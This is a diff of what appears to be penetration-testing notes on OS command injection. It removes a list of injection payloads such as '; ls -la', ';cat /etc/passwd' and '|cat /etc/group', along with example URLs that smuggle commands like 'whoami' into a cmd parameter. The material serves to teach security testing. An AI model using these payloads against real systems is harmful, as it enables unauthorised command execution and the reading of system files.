@@ -19,15 +19,8 @@ Techniques for exploitation:
 •	Response content or size: A change in the page's behavior may indicate successful command execution.
 
 
-Payload’s For command Injection: https://github.com/payloadbox/command-injection-payload-list
 •	Payloads vary depending on the target operating system.
-; ls -la
-|hostname 
-||whoami
-&hostname
-;netstat -antp
-;cat /etc/passwd
-|cat /etc/group
+
 
 Common Parameters to test : https://1drv.ms/w/c/0929e0a398c9d676/EW1StcgFAPpIs67i80yssVcBWfmW0zmuEINHJskV8tuB-w?e=AE8dsI
 
@@ -37,13 +30,7 @@ Common Parameters to test : https://1drv.ms/w/c/0929e0a398c9d676/EW1StcgFAPpIs67
 
 
 http://example.com/cmd.php?cmd=whoami 
-http://example.com/cmd.php?cmd=; whoami
-http://example.com/cmd.php?cmd=| whoami
-http://example.com/cmd.php?cmd=& whoami
-http://example.com/cmd.php?cmd=sysinfo
-http://example.com/cmd.php?cmd=ls
-http://example.com/cmd.php?cmd=; ls
-http://example.com/cmd.php?cmd=dir etc…
+
 
 
 
